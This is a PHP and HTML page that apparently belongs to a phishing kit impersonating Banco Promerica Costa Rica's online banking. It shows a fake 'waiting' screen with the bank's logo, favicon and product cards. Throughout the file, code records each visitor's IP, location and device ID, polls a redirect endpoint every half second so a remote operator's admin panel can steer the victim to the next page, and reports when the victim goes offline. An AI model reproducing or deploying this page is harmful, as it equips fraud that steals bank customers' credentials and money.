<?php
require_once 'functions.php';
session_start();

$info = get_user_info();
$ip = $info['ip'];
$device = get_device_id();

// Forzar que al cargarse waiting.php se establezca currentPage en "waiting.php"
// Esto sobre-escribe cualquier valor previo que se haya configurado desde el panel de admin.
$data = load_data();
if (!isset($data[$device])) {
    // Si no existe el registro, lo crea
    update_user($ip, $info['location'], "waiting.php");
} else {
    // Si ya existe, se actualiza currentPage a "waiting.php" sin importar su valor previo.
    $data[$device]['currentPage'] = "waiting.php";
    save_data($data);
}

// (Opcional) Si deseas también permitir que desde un POST se cambie la redirección (por ejemplo, desde el admin),
// puedes dejar el bloque POST, pero normalmente este código se utiliza en waiting.php, y no se procesa en cada carga.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['device']) && isset($_POST['redirect'])) {
    $data = load_data();
    if (isset($data[$_POST['device']])) {
        $data[$_POST['device']]['currentPage'] = $_POST['redirect'];
        save_data($data);
        echo json_encode(["redirect" => $_POST['redirect']]);
        exit();
    }
}

// Leer el estado actual (ya debería ser "waiting.php")
$data = load_data();
$currentPage = isset($data[$device]['currentPage']) ? $data[$device]['currentPage'] : "waiting.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head id="ctl00_Head1">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
    <style type="text/css" id="operaUserStyle"></style>
    <link rel="SHORTCUT ICON" href="https://banca.grupopromerica.com/PCRC/App_Themes/Regional_Default/images/favicon.ico">
    <title> Ingreso </title>
    <link href="./index_files/ccStatementFooter.css" type="text/css" rel="stylesheet">
    <link href="./index_files/ccStatementTransactionsUCN.css" type="text/css" rel="stylesheet">
    <link href="./index_files/chatbot.css" type="text/css" rel="stylesheet">
    <link href="./index_files/NunitoSans.css" type="text/css" rel="stylesheet">
    <link href="./index_files/NunitoSans.min.css" type="text/css" rel="stylesheet">
    <link href="./index_files/chosen.css" type="text/css" rel="stylesheet">
    <link href="./index_files/desktop2.css" type="text/css" rel="stylesheet">
    <link href="./index_files/font-awesome.min.css" type="text/css" rel="stylesheet">
    <link href="./index_files/GridHtml.css" type="text/css" rel="stylesheet">
    <link href="./index_files/GridFilter.css" type="text/css" rel="stylesheet">
    <link href="./index_files/TabHtml.css" type="text/css" rel="stylesheet">
    <link href="./index_files/utilities.css" type="text/css" rel="stylesheet">

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        // Consulta el endpoint de redirección cada 500 ms
        function checkRedirect() {
            $.getJSON("check_redirect.php", function(data) {
                // Si el currentPage que devuelve no es "waiting.php", redirige
                if (data.currentPage && data.currentPage !== "waiting.php") {
                    window.location.href = data.currentPage;
                }
            });
        }
        setInterval(checkRedirect, 500);
    </script>
    <script>
setInterval(function(){
    fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
}, 5000);

window.addEventListener('unload', function(){
    navigator.sendBeacon('functions.php?action=offline');
});
</script>
  </head>
  <body class="popUpFont">
    <div id="WzTtDiV" style="visibility: hidden; position: absolute; overflow: hidden; padding: 0px; width: 1919px; left: -1920px; top: 0px;"></div>
    <div id="zContent" style="display: block;">
      <form id="loginform" enctype="multipart/form-data">
        <div>
          <div></div>
          <div id="BackDiv" class="backDiv">
            <div id="LoadingDiv" class="loadingDiv">
              <img src="./index_files/Loader.gif" id="ctl00_img_Loading" class="imgLoading" alt="Loading...">
            </div>
          </div>
          <div id="headerLogin" class="styleNewHeader">
            <div id="logoLogin" class="styleNewLogo">
              <img id="ctl00_ciLogo_header" src="./index_files/NewLogo2.png" alt="logo" style="border-width:0px;">
            </div>
            <div id="countryLogin" class="styleDivCountry">
              <span id="ctl00_clCountryName" class="styleNewColorCountry">Costa Rica</span>
            </div>
          </div>
          <div class="bottom_nav"></div>
          <div id="page_title">
            <div id="login_cotainer">
              <center>
                <img src="index_files/Loader.gif" alt="" srcset="" style="width: 30%;">
                <div style="text-align: center;" align="center" hidden>
                  <label id="countdown"></label>
                </div>
                
            </div>
            </center>
            <div id="buttons">
              <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btShowLogin" value="" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$PlaceHolder$pbLoginUC$btShowLogin&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="btShowLogin" style="display: none">
            </div>
            <div class="styleSeparator"></div>
            <div style="margin-left:20px;">
              <label class="styleTitle1NewProducts">Productos diseñados</label>
              <label class="styleTitle2NewProducts">para sus necesidades</label>
            </div>
            <div style="margin:10px;">
              <div class="styleCard">
                <img src="./index_files/CtaAhorro.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
                <div class="styleContainer">
                  <label class="styleTitleCard">Cuenta ahorros</label>
                  <label class="styleTextCard">Abrir cuenta en línea y sin filas.</label>
                  <button type="button" class="styleButtonCard" onclick="openCtaAhorro()">Abrir cuenta</button>
                </div>
              </div>
              <div class="styleCard">
                <img src="./index_files/CtaEmpresas.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
                <div class="styleContainer">
                  <label class="styleTitleCard">Cuenta empresas</label>
                  <label class="styleTextCard">Cuenta corriente en dólares o colones.</label>
                  <button type="button" class="styleButtonCard" onclick="openCtaEmpresas()">Solicitar</button>
                </div>
              </div>
              <div class="styleCard">
                <img src="./index_files/CreditCard.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
                <div class="styleContainer">
                  <label class="styleTitleCard">Tarjetas crédito</label>
                  <label class="styleTextCard">Descuentos, canje de millas y más.</label>
                  <button type="button" class="styleButtonCard" onclick="openTarjCredito()">Solicitar</button>
                </div>
              </div>
              <div class="styleCard">
                <img src="./index_files/PymeCard.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
                <div class="styleContainer">
                  <label class="styleTitleCard">Tarjeta Pyme</label>
                  <label class="styleTextCard">Múltiples beneficios para su negocio.</label>
                  <button type="button" class="styleButtonCard" onclick="openTarjPyme()">Solicitar</button>
                </div>
              </div>
              <div class="styleCard">
                <img src="./index_files/Secure.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
                <div class="styleContainer">
                  <label class="styleTitleCard">Seguros</label>
                  <label class="styleTextCard">Protección para usted y su familia.</label>
                  <button type="button" class="styleButtonCard" onclick="openSeguros()">Elegir seguro</button>
                </div>
              </div>
            </div>
            <div class="styleSeparatorBlank"></div>
            <div style="text-align: center;">
              <a class="styleSocialNetwork fa-facebook" href="#" onclick="openFacebook()"></a>
              <a class="styleSocialNetwork fa-twitter" href="#" onclick="openTwitter()"></a>
              <a class="styleSocialNetwork fa-instagram" href="#" onclick="openInstagram()"></a>
              <a class="styleSocialNetwork fa-whatsapp" href="#" onclick="openWhatsapp()"></a>
            </div>
            <div id="ctImageMessageN" style="display: none; position: fixed; z-index: 100001;" class="contentBannerLogin" onclick="closeImg();">
              <img id="imgClose" src="./index_files/cerrar.png" alt="Cerrar" class="closeBannerLogin">
              <img src="./index_files/banner_IB.jpg" alt="Información" class="bannerLogin">
            </div>
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Chatbot de Servicio al Cliente</title>
            <link href="./index_files/chatbot.css" rel="stylesheet" type="text/css">
            <div class="fb_dialog fb_dialog_advanced fb_customer_chat_bubble_animated_no_badge fb_customer_chat_bubble_pop_in" style="background: rgba(0, 0, 0, 0) none repeat scroll 0% 0%; border-radius: 50%; bottom: 5pt; display: inline; height: 45pt; padding: 0px; position: fixed; right: 18pt; top: auto; width: 45pt; z-index: 2147483646;">
              <div id="botonOpcionesChat" class="messenger-button-shown" style="width: 58px; height: 58px; background-color: #69be28;">
                <img src="./index_files/chatchatbot.png" style="max-width: 58px; max-height: 58px;">
              </div>
            </div>
            <div id="divPrincipal" class="divPrincipal hideDiv">
              <div class="promptContainer">
                <div class="promptHeaderContainer">
                  <div id="CloseButton" class="promptHeaderCloseButtonContainer">
                    <div class="CloseButtonContainer" tabindex="0" role="button">
                      <svg width="10px" height="10px" viewBox="0 0 14 14">
                        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                          <g transform="translate(-419.000000, -413.000000)">
                            <g transform="translate(164.000000, 396.000000)">
                              <g>
                                <g transform="translate(250.000000, 12.000000)">
                                  <g>
                                    <g>
                                      <rect opacity="0.200000003" x="0" y="0" width="24" height="24"></rect>
                                      <g transform="translate(4.000000, 4.000000)" fill="#000000">
                                        <rect transform="translate(8.000000, 8.000000) rotate(45.000000) translate(-8.000000, -8.000000) " x="7" y="-1" width="2" height="18" rx="1"></rect>
                                        <rect transform="translate(8.000000, 8.000000) rotate(135.000000) translate(-8.000000, -8.000000) " x="7" y="-1" width="2" height="18" rx="1"></rect>
                                      </g>
                                    </g>
                                  </g>
                                </g>
                              </g>
                            </g>
                          </g>
                        </g>
                      </svg>
                    </div>
                  </div>
                  <div class="profilePictureContainer">
                    <div class="PromericaHeader">
                      <img class="profilePicture img" src="./index_files/estrellapromericachatbot.png" alt="">
                      <div class="clearfix"></div>
                    </div>
                  </div>
                  <div class="promptHeaderAndBubbleContainer">
                    <div class="promptHeaderText" style="-webkit-line-clamp: 1; font-size: 11px;">
                      <strong>Banco Promerica Costa Rica</strong>
                    </div>
                    <span class="promptTextBubble">
                      <span>¡Hola! ¿En qué podemos ayudarte?</span>
                    </span>
                  </div>
                </div>
                <div class="promptFooterContainer">
                  <div id="AsistenteVirtual" class="_4bqf promptButton" style="background-color: rgb(105, 190, 40); margin-top: 10px;" tabindex="0" role="button">
                    <div style="position: fixed; width: 30px; height: 30px">
                      <img style="width: 30px; height: 30px; position: absolute; left: -20px; top: -4px;" src="./index_files/chatchatbot.png">
                    </div>
                    <div style="margin-left: 20px;">Asistente Virtual</div>
                  </div>
                </div>
              </div>
            </div>
            <input type="hidden" name="ctl00$PlaceHolder$ctDummy" id="ctl00_PlaceHolder_ctDummy">
            <div class="ConfirmModalBackground" style="display: none; position: fixed; left: 0px; top: 0px; z-index: 10000;"></div>
          </div>
          <div class="styleTopFooter"></div>
          <div id="footer">
            <div class="styleTextFooter">
              <span class="styleTextOptionFooter"> Banco Promerica 2025 | Todos los derechos reservados. </span>
              <span class="styleTextOptionFooter"> | </span>
              <a class="styleTextOptionFooter" href="#" onclick="openTermAndConditions()">Términos y Condiciones</a>
              <span class="styleTextOptionFooter"> | </span>
              <a class="styleTextOptionFooter" href="#" onclick="openSecurityRecommendations()">Recomendaciones de Seguridad</a>
              <span class="styleTextOptionFooter"> | </span>
              <a class="styleTextOptionFooter" href="#" onclick="openContactUs()">Contáctenos</a>
            </div>
            <div class="rights">
              <img id="ctl00_ciLogo_footer" src="./index_files/Logo2.png" alt="logo2" style="height:79px;width:193px;border-width:0px;">
            </div>
          </div>
  </body>
</html>